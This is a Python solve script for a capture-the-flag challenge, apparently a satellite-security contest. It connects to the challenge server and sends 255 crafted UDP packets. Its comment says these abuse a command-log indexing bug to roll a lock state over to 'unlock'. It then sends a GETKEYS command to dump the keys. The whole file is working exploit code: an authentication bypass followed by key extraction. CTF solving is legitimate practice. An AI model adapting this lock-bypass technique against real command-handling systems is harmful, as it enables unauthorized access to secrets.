import socket

SERVER = "lucky-tree.satellitesabove.me"
PORT = 5008

TICKET = "<your ticket>"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((SERVER, PORT))
sock.recv(1024)

sock.send(TICKET.encode())
res = sock.recv(1024).decode().split(':')
chall_ip = res[1]
chall_port = int(res[2])

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.connect((chall_ip, chall_port))

# lock bypass | command_log[-8]++ => lock_state++
# 0x01++, ..., 0xff++ = 0x00 = UNLOCK
for i in range((16 ** 2) - 1):
    sock.send(b'\xff\xff\xff\xff\xf8\xff\xff\xff')
    sock.recv(1024)

# id = COMMAND_GETKEYS = 9
id = 9
payload = chr(0) * 4 + chr(id) + chr(0) * 3
sock.send(payload.encode());
print(sock.recv(1024).decode())
sock.close()
